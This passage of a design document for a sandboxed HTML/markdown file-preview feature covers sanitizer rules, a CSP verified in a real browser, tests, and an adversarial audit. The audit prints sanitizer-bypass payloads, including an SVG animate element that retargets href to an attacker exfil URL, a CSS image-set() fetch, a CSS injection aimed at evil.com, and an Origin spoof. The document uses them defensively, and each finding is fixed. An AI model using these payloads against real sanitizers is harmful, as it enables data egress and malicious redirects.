| Other dropped attributes | `srcdoc`, `formaction`, `xlink:href`, `action`, `background`, `dynsrc`, `lowsrc`, `ping`, `http-equiv` |
| `style` attribute | Kept, but `url()` values processed per CSS rules; `expression(`, `behavior:`, `-moz-binding`, `@import` stripped |
| URL-bearing attributes processed | `src`, `href` (on `link` only), `poster`, `srcset` |
| `<a href>` | **`href` stripped entirely**; link text preserved; original (truncated) URL in `data-ao-href` for display. Not recorded as `dropped` — anchors are *neutralized*, not failed assets. **Rationale (corrected — see §2.2.1):** a sandboxed iframe can navigate **itself**, and no CSP directive stops navigation, so a live `href` is a real one-click egress/redirect channel — **not** "dead UI the sandbox blocks." Stripping it is a genuine security control that neither the sandbox nor CSP provides. Stripping alone is *insufficient*, because SMIL animation can retarget `href` at render time — hence the row below |
| SVG SMIL animation | `animate`, `set`, `animateTransform`, `animateMotion`, `discard` dropped **with subtree** (§10, H1). They retarget arbitrary attributes (`attributeName="href"`) to attacker-chosen values at render time, defeating `href`/`src` stripping in the emitted markup. No legitimate use in a static preview, so dropped outright — no functionality tradeoff |
| CSS | `url(...)` rewritten by the same URL rules; `@import` resolved **in-root only**, max depth `HTML_MAX_IMPORT_DEPTH = 3` (`depth-exceeded` beyond), with a **visited-set so an import cycle terminates** |

**URL pipeline** (one function, used by every URL site — attributes, `srcset` candidates,
CSS `url()`, `@import`):

```text
FUNCTION process_url(raw, html_file_dir, root, budget):
  u = strip_whitespace_and_control_chars(raw)     # BEFORE scheme detection:
                                                  # "java\tscript:alert(1)" is a real bypass
  scheme = detect_scheme(u)
  IF scheme == "data":
     RETURN keep IF mime IN IMAGE_AND_FONT_ALLOWLIST ELSE drop("unsupported-scheme")
  IF scheme IN ("http","https"):        RETURN drop("external")
  IF scheme IS NOT NONE:               RETURN drop("unsupported-scheme")   # file:, javascript:,
                                       # vbscript:, blob:, "//host", "\\host", anything else
  # relative or in-root-absolute:
  u = percent_decode_once(u)
  IF contains_nul(u):                  RETURN drop("unsupported-scheme")
  target = resolve_against(html_file_dir, u)
  IF NOT contained_in_root(target, root):        RETURN drop("outside-root")   # same guard
  IF NOT exists(target):                         RETURN drop("not-found")      # as FileBrowser
  IF size(target) > HTML_ASSET_MAX_BYTES:        RETURN drop("too-large")      # .resolve
  IF budget.used + size(target) > HTML_INLINE_BUDGET_BYTES:
                                                 RETURN drop("budget-exhausted")
  budget.used += size(target)
  RETURN inline_as_data_uri(target)              # never partial — whole asset or none
```

**Route + error mapping.** `PathNotAllowedError → 403`, `PathNotFoundError → 404`,
non-markup file → **400**.

### 4.3 `ui/security.py` — Origin/Host hardening (1A.3)

Full design in §2.10. Structurally: Starlette middleware added in `create_app`, with `ao ui`
passing its bound host into the allowlist. Tracked as its own task
(`T-Sh6Rz3-origin-host-csrf`) because it closes a pre-existing critical gap and is valuable
independent of the preview feature — it should be reviewable, testable, and revertable on
its own.

**The CSP on the SPA document was verified empirically, not guessed — RESOLVED.** Shipped
policy, unchanged from the drafted starting point because verification confirmed it:

```text
default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline';
font-src 'self' data:; connect-src 'self'; frame-src 'self' data:;
object-src 'none'; base-uri 'none'; form-action 'none'
```

Live in `src/agent_orchestrator/ui/security.py` as `SPA_CSP`, applied only to `text/html`
responses outside `/api/` (`_is_spa_document`).

**Verification method — SPA CSP (real browser, with a negative control).** Served this exact
header string from a plain `http.server` response and loaded it in **real headless Chrome**
(`google-chrome-stable --headless=new`), then screenshotted. The page embedded a
`sandbox=""` iframe (no `allow-scripts`, no `allow-same-origin`) whose `srcDoc` contained
`<img src="data:image/png;base64,…">` — a solid-red 2×2 PNG. **Positive control:**
pixel-sampling the screenshot at the image's location returned the exact red RGB value, i.e.
the sandboxed `srcdoc` frame rendered *and* its inlined `data:` image loaded under this
precise policy. **Negative control:** re-running with `img-src 'self'` (i.e. `data:`
removed) and everything else identical returned the page background color at that same pixel
instead.

The negative control is the part that matters: it proves the policy **discriminates** rather
than being permissive-by-accident, and it isolates `data:` in `img-src` as the specific
directive doing the work. A test that only ever passes cannot distinguish "correctly
configured" from "trivially allows everything."

`frame-src 'self' data:` covers the sandboxed `srcDoc` frame itself; `connect-src 'self'`
with no wildcard host anywhere is what upholds I2.
`tests/ui/test_security.py::TestSecurityHeaders::test_spa_document_response_carries_the_csp`
pins the header value as a regression check — it cannot drive a browser, so it is a guard
against silent edits, **not** a substitute for the manual verification above.

**Verification method — frame CSP (§5.4's `PREVIEW_CSP`).** Independently verified the same
way: headless Chrome, `sandbox=""` iframe, the exact policy string in a `<meta http-equiv>`
inside `srcdoc`. Both an inlined `<style>` block and a `data:image/png` rendered correctly,
confirming `style-src 'unsafe-inline' data:` and `img-src data:` are each doing real work
rather than being permissive-by-accident. Narrative preserved at the constant in
`ui/src/components/viewer/HtmlPreview.tsx`.

**Note the scope limit of both verifications.** They establish that the policies permit what
the feature needs and forbid the subresource classes they name. They say nothing about
navigation, because **no CSP directive governs navigation** (§2.2.1) — which is precisely how
finding H1 (§10) reached a shipped build.

---

## 5. Frontend design

Renders in the **dashboard origin**, so §2.7 (markdown), §2.8 (highlighter), and §2.9
(sandbox) all apply here. Server output is authoritative (I3); everything below is defence
in depth or presentation.

### 5.1 Mode selection by `kind` (1B.2)

| `content.kind` | View | Default |
|---|---|---|
| `text` + markdown extension | **Preview \| Source** toggle | **Preview** |
| `text` otherwise | `CodeView` (highlighted) | — |
| `markup` | **Preview \| Source** toggle | **Source** |
| `image` | `ImageView` from `data_uri`; if `null` (over cap) show size + reason | — |
| `binary` | existing metadata banner | — |

**Why `markup` defaults to Source.** Previewing untrusted markup should be a **deliberate
click**, not something that happens because the user clicked a filename in a tree. The
sandbox makes preview safe; defaulting to Source makes it *chosen*. Markdown defaults to
Preview because that is what markdown is for and it goes through DOMPurify either way.

### 5.2 `CodeView` (1B.3)

`highlight.js` with a **curated language subset** registered explicitly — `python,
typescript, javascript, json, yaml, toml, rust, go, c, cpp, java, bash, markdown, xml/html,
css, sql, diff, dockerfile, ini`. The bundle ships **inside the Python wheel**, so size is a
real cost paid by every `pip install`, and fewer grammars is also less regex surface (§2.8).

- `HIGHLIGHT_MAX_BYTES = 256_000` cap → plain text with a note beyond it (§2.8).
- Unknown language → plain text, no grammar guessing.
- Line numbers via **CSS counters / `user-select: none`** — never line-number text in the
  same node as the code, so copying code copies *code*. A viewer whose copy button yields
  unusable text is a viewer people stop using.

### 5.3 `MarkdownView` (1B.4)

Design in §2.7. Note the deliberate reuse: relative image refs are resolved by calling
`/api/files/content` for the sibling path and substituting `data_uri` — **the server's
containment guard, not a second resolver in TypeScript** (§2.4). Fenced code blocks go
through the same capped `hljs` path as `CodeView`.

### 5.4 `HtmlPreview` (1B.5)

```tsx
<iframe
  sandbox=""                      // NO allow-scripts, and NEVER allow-same-origin:
                                  // the two together defeat the sandbox entirely — framed
                                  // content would run in OUR origin and could strip this
                                  // very attribute. See ADR-0011 / HLD §2.9.
  referrerPolicy="no-referrer"
  srcDoc={preview.html}
  title={`Preview of ${preview.path}`}
/>
```

Plus the frame-level `<meta http-equiv="Content-Security-Policy">` from §2.2, and the
provenance panel above the frame: `scripts_removed`, `inlined`, and `dropped` grouped by
reason — **rendered as text, never as links** (§3.2).

### 5.5 Typography controls (1B.6)

Font family (system / serif / mono), size, line height, letter spacing — applied as **CSS
custom properties** on the viewer container, persisted to `localStorage` under one
namespaced key.

- **Validate and clamp everything read back from storage.** `localStorage` is
  attacker-writable by anything that ever ran in the origin, and is trivially editable by
  the user. Never interpolate a stored string into a style attribute — a stored value of
  `12px; background: url(https://evil.com/)` is a CSS injection with an egress channel.
  Parse to a number, clamp to a range, map family names through a fixed lookup.
- **Applies to `CodeView`, `MarkdownView`, and plain text. NOT to `HtmlPreview`** — that
  content brings its own styling and injecting ours would misrepresent what the file
  actually is. A comment must say so; it looks like an oversight otherwise.

---

## 6. API surface (additions only)

| Method | Path | Purpose | Errors |
|---|---|---|---|
| GET | `/api/files/content?path=&root=` | **extended**: adds `kind`, `mime`, `data_uri` | 403 traversal · 404 missing |
| GET | `/api/files/html?path=&root=` | **new**: sanitized self-contained HTML (`HtmlPreview`) | 403 traversal · 404 missing · **400 non-markup file** |

All responses additionally carry the §2.10 layer-4 headers; the SPA document additionally
carries the layer-5 CSP. No other endpoint's contract changes.

---

## 7. Testing

Full lists live in the task tickets (`T-Bk4Hs7`, `T-Sh6Rz3`, `T-Fv9Ld2`). Structure:

| Tier | Location | What it proves |
|---|---|---|
| Unit (Python) | `tests/ui/test_files.py` | Classification: magic-byte vs extension disagreement; SVG → `markup`; `data_uri` cap |
| Unit (Python) | `tests/ui/test_htmlpreview.py` | Sanitizer, URL pipeline, budgets, CSS/`@import`, **escaping on re-serialize** |
| Unit (Python) | `tests/ui/test_security.py` | Host 421 · cross-origin 403 · absent-Origin allowed · 415 · `*` disables |
| Integration | `tests/ui/test_api_integration.py` | Real routing + status mapping for both endpoints, traversal on both |
| Unit (frontend) | `ui/src/test/*.test.tsx` | Mode selection, highlight cap, markdown sanitization, iframe sandbox attrs, dropped-refs-as-text, typography clamping |

**Every mitigation in §2 has at least one test whose failure means the mitigation is gone.**
A security control with no regression test is a comment.

Two things the test strategy must not do:
1. **Do not weaken a control globally to make fixtures pass.** The `TestClient`
   `Host: testserver` accommodation lives in one place and is paired with tests that assert
   rejection still happens (§2.10 note).
2. **Do not test the sanitizer only through the happy path.** The interesting inputs are
   malformed: nested tag reassembly, unquoted attributes, control characters inside scheme
   names, comment-smuggled markup, `@import` cycles.

Also required: **existing `tests/ui/*` keep passing**, and `FileContent`'s additions stay
additive.

### 7.1 Verified results (as shipped)

| Gate | Result |
|---|---|
| `uv run pytest -q` | **1793 passed, 7 skipped** (pre-epic baseline: 1651 passed / 7 skipped) |
| `uv run ruff check .` | clean |
| `uv run ruff format --check .` | clean except `tests/test_e2e_builtin_routed_runner.py` — confirmed failing **identically at HEAD** and untouched by this epic |
| `uv run mypy src` | clean except the 4 pre-existing `_version.py` errors — confirmed failing **identically at HEAD** and untouched |
| `ui/`: `npm run typecheck` | clean |
| `ui/`: `npm test` | **79 tests passed** across 8 files |
| `ui/`: `npm run build` | succeeds |

The two non-clean gates were each checked against HEAD to confirm they are pre-existing rather
than introduced — an important distinction to record, since "clean except X" is otherwise
indistinguishable from a regression being waved through.

### 7.2 Accepted tradeoff — frontend bundle size

The built frontend grew **66.2 KB → ~120 KB gzip**. It ships **inside the Python wheel**, so
every `pip install agent-orchestrator[ui]` pays this, whether or not the user ever opens a
file preview.

Accepted, because the alternatives are worse: fetching `highlight.js`/`marked`/`dompurify`
from a CDN breaks the offline, local-first posture (and would need CSP holes pointing at a
third-party origin — directly against I2), and dropping DOMPurify is not on the table since
markdown renders in the privileged origin (§2.7).

**The lever, if this becomes a problem:** trim the curated `highlight.js` language list in
`ui/src/components/viewer/CodeView.tsx` — it is 18 explicit `registerLanguage` calls in one
place, and each removal is a one-line change with a graceful degradation (an unregistered
language renders as plain text, never an error). That is deliberately the cheapest knob in the
system to turn. Note the language list is also a *security* surface (§2.8), so trimming it is
strictly an improvement on that axis.

---

## 8. Non-goals (v1)

- **Authentication.** Unchanged from ADR-0010 D7; see §2.11 and
  [`meta/ROADMAP.md`](../meta/ROADMAP.md) §3.1.
- **A raw-bytes file endpoint.** Explicitly rejected, with reasons (§3.2). Not "deferred."
- **Executing scripts in previews at all.** The optional per-file `allow-scripts` toggle was
  **deliberately not implemented** — taking the contract's own "if you are not confident, omit
  it" branch (§2.9). `sandbox=""` is unconditional. Given finding H1 (§10) demonstrated a live
  egress channel with scripting *fully disabled*, declining to add a scripting switch on top
  looks like the right call rather than a missing feature.
- **Live editing of workspace files** from the viewer.
- **Video/audio preview**; large media do not fit the inline budget (§3.3).
- **Server-side markdown rendering.** Markdown stays client-side; the server does not grow a
  second HTML-producing path to audit.
- **A trusted-host allowlist for external assets.** Would break I2.

---

## 9. Questions resolved, and what remains open

### 9.1 Resolved

- **RESOLVED — SPA CSP.** *Was:* does the §4.3 policy permit a sandboxed `srcdoc` iframe with
  inlined `data:` images? **Yes.** Verified empirically **twice independently** in real
  headless Chrome — once for the SPA document policy, once for the frame `<meta>` policy — each
  with a **negative control** proving the policy discriminates rather than being
  permissive-by-accident. The drafted policy shipped unchanged. Full method, controls, and the
  scope limit are in §4.3. Verification narratives are preserved at the constants themselves
  (`security.py::SPA_CSP`, `HtmlPreview.tsx::PREVIEW_CSP`) so they cannot drift from the values
  they justify.
- **RESOLVED — the `allow-scripts` toggle.** **Not implemented**, taking the contract's
  "if you are not confident, omit it" branch. See §8.
- **RESOLVED, AND THE ANSWER WAS "NO" — "does the sandbox contain navigation?"** This was not
  even recorded as an open question; it was stated as settled fact and used as a rationale. It
  was **false**. See §2.2.1 and §10 (H1). The lesson is filed in ADR-0011: an unexamined
  premise is more dangerous than an acknowledged unknown, because nothing prompts anyone to
  check it.

### 9.2 Still open

- `OPEN_QUESTION:` The element/attribute policy shipped as a **blocklist plus special cases**,
  not the keep-only allowlist this design specified (§4.2, §10). It is now correct against every
  payload tried, but a blocklist is structurally a bet that the dangerous set was fully
  enumerated — and H1/M1 are direct evidence that bet loses periodically. Converting to a true
  allowlist is the highest-value follow-up; ADR-0011 records why the layering makes deferring it
  survivable rather than reckless.
- `OPEN_QUESTION:` Verification used **headless Chrome only**. Firefox and WebKit were not
  tested. The CSP and sandbox semantics relied on are broadly interoperable, but "verified in
  one engine" is the honest claim.
- `ASSUMPTION:` `HTML_INLINE_BUDGET_BYTES = 10_000_000` covers realistic workspace reports.
  *Risk:* asset-heavy documents preview incompletely. *Mitigation:* the `dropped` panel makes
  every omission visible with a reason, and the constants are named in one place so raising
  them is a one-line change — the fix is never a raw endpoint (§3.3).
- `ASSUMPTION:` The curated `highlight.js` language set covers the languages workspaces
  actually contain. *Risk:* an unlisted language renders as plain text. *Mitigation:*
  graceful — plain text, not an error — and adding a grammar is a one-line registration
  weighed against wheel size.

---

## 10. Adversarial audit findings and resolutions

After implementation, a dedicated **adversarial security audit** attacked the shipped code —
execution-confirmed, in a real browser, with real captured network requests rather than by
reading the diff. All findings below are **fixed and re-verified**.

The audit's central structural finding: the implementation shipped an element/attribute policy
that is a **blocklist plus special cases** (`DROPPED_ELEMENTS_WITH_SUBTREE`, `HARD_DROP_ATTRS`,
`on*`, plus URL-attribute processing; everything else passes through escaped) rather than the
**keep-only allowlist** §4.2 specified. That is a deliberate, documented reading of the
contract's "drop these" rule lists — but it inverts the safety property. An allowlist fails
toward a missing tag; a blocklist fails toward a live one. H1 and M1 are that difference,
realized.

### 10.1 H1 (High) — SVG SMIL animation retargets attributes, defeating `href` stripping

**Payload.**
```html
<svg><a><text>x</text><animate attributeName="href" values="http://attacker/exfil"/></a></svg>
```

**Why it worked.** The sanitizer correctly stripped `<a href>`, so the emitted markup contained
no live URL. But SMIL animation elements retarget **any** attribute — `attributeName="href"`,
`attributeName="src"` — to an attacker-chosen value **at render time**, inside the renderer,
after sanitization is over. The sanitizer's output was clean; the DOM the browser built was not.
Being a blocklist, the element policy passed `<animate>` through as an unrecognized-but-not-
forbidden tag.

**Confirmed, not theorized.** In real headless Chrome, a genuine synthetic click on the animated
`<a>` made the sandboxed iframe **self-navigate** to the attacker URL, with the request
**captured on a listener**.

**Severity reasoning — why High and not Critical.** The navigation was contained to the iframe;
**the top frame never moved (verified)**. So it is **not** a sandbox escape and **not** an origin
compromise — no workspace read, no `POST /api/runs`, no spend. But it *is* a live one-click
egress and malicious-redirect channel, and therefore a genuine breach of the design's stated
**I2 "no network egress channel"** invariant. A document claiming an invariant it does not hold
is worse than one that never claimed it.

**Why all three defence layers missed it — the important part.** Navigation is the single gap
where the whole stack is silent (§2.2.1): the sandbox permits self-navigation by design, **no CSP
directive governs navigation at all**, and the opaque origin makes the navigation harmless *to
the dashboard* while doing nothing to stop the request leaving. This is the one class that
**had** to be fixed in the sanitizer.

**Fix.** Added `animate`, `set`, `animateTransform`, `animateMotion`, `discard` to
`DROPPED_ELEMENTS_WITH_SUBTREE`. There is no legitimate use for live attribute retargeting in a
static preview, so this costs no functionality and needs no per-attribute special-casing.
**Re-verified:** the payload was re-fired post-fix — elements gone, **zero** occurrences of the
attacker host in the output.

### 10.2 M1 (Medium) — CSS `image-set()` bypassed the URL pipeline

**Payload.** `background: image-set("http://attacker/x.png" 1x)`

**Why it worked.** `image-set()` is a distinct CSS `<image>` value that can take **bare string**
candidates — no `url(` token — so the `url(...)`-oriented rewriting missed it entirely.

**Why it was never exploitable in shipped form.** The frame CSP's `img-src data:` blocked the
load — proven with positive **and** negative controls, not assumed. So layer 3 held where layer 2
failed, which is the layering working exactly as ADR-0011 D2 intends.

**Why it was still worth fixing at Medium.** Nothing pinned the *sanitizer's own* correctness
here. The mitigation was entirely a CSP side effect, so any future widening of `img-src` — a
plausible change, e.g. to support some new inline asset type — would have silently reopened a
live egress channel with no test failing. Depending on another layer to cover your bug is fine;
depending on it *without knowing you are* is not.

**Fix.** `image-set()` / `-webkit-image-set()` candidates now route through the same URL
pipeline as everything else. Implementation note worth keeping: only the function's **opening**
paren is matched by regex, with the matching close paren found by a paren-counting scan, because
candidates nest (`image-set(url(a.png) 1x, …)`) and a single regex cannot balance parens
reliably.

### 10.3 L1–L4 (Low) — all fixed

| # | Finding | Resolution and honest severity note |
|---|---|---|
| **L1** | **CSS comments defeated the dangerous-token strip.** `width:exp/**/ression(alert(1))` and `-moz/**/-binding:url(…)` slipped past `_CSS_DANGEROUS_TOKEN_RE`, which ran *before* comment removal. | Comments are now stripped **before** token matching. Note the constructs themselves (`expression()`, `-moz-binding`) are **dead in all current browsers** — so this was defence-in-depth hygiene, not a live hole. Fixed because ordering bugs of this shape generalize. |
| **L2** | **`srcset` splitting mangled `data:` URI candidates** (commas inside a base64 payload were treated as candidate separators). | Correctness bug, **not** a security issue — it broke legitimate images rather than admitting illegitimate ones. Fixed. |
| **L3** | **Rebound `xlink:href` namespace prefixes** — e.g. declaring a different prefix bound to the XLink namespace to dodge the literal `xlink:href` attribute-name drop. | Reasoned **unreachable** in practice: HTML foreign-content parsing does not honor arbitrary namespace prefix rebinding the way a real XML parser would. Closed anyway rather than resting on a parser-behaviour argument. |
| **L4** | **`Origin` normalization silently stripped userinfo and ignored scheme** — `urlsplit("http://evil.com@localhost").hostname` returns `"localhost"`, normalizing straight past a spoofed prefix. | **Not browser-reachable** (browsers never construct an `Origin` with userinfo), so no live exposure. Fixed by failing closed on any `@` in `Host` or `Origin` — accepting-what-a-spoof-would-send is the wrong default even when unreachable. Same guard applied to both headers. |

### 10.4 Attacked and found sound (negative results worth recording)

These are not absence of evidence — the audit actively tried each and failed, which is
meaningful evidence about the design rather than about the tester.

| Attempted | Why it failed |
|---|---|
| `<scr<script>ipt>` and nested-tag reassembly | Fails against `html.parser` for the **same tokenizer reason** it fails against real browsers — the parse is tag-by-tag, so there is no string-level reassembly step to exploit. This is the concrete payoff of §4.2's parse-don't-regex rule. |
| CDATA-in-SVG smuggling | Dropped wholesale. |
| Double-encoded traversal (`%252e%252e%252f`) | **Percent-decode-once** resists it by construction — decoding twice is what would have created the hole (a risk this design flagged up front, `T-Bk4Hs7` Risks). |
| `data:image/svg+xml` as an inlined image | **Excluded from the inline MIME allowlist** deliberately: navigating directly to such a URI executes its script. SVG is markup everywhere in this pipeline, including inside a `data:` URI (§2.6). |
| Eight malformed/truncated documents | Neither raised nor hung — the tolerant-parser choice holds under garbage input. |
| Bodyless cross-origin state-changing request without an `Origin` header | **Browsers cannot produce one** — verified with a real cross-origin form POST. This is what makes the Content-Type gate's bodyless exemption (`POST /api/runs/{id}/resume`, `DELETE /api/runs/{id}`) a safe scoping decision rather than a bypass: the `Origin` check still covers those requests, and the exempted shape is not browser-constructible. |

### 10.5 What this audit changes about the design's claims

Three corrections to how this document should be read:

1. **§2's mitigation table describes the design, and the design was right — but the first
   implementation did not fully realize it.** The gap was allowlist-vs-blocklist, and it was
   load-bearing, not stylistic.
2. **The "no egress channel" invariant (I2) was briefly false in a shipped build** (H1). It is
   now true against every payload tried. Stating an invariant is not the same as holding one, and
   only adversarial execution distinguishes them.
3. **The layering is load-bearing, not belt-and-braces.** M1 was neutralized by layer 3 alone;
   H1 was contained (no origin compromise) by layer 1 alone. Both statements are only true
   because the layers were built as independent controls. See ADR-0011's post-audit note.
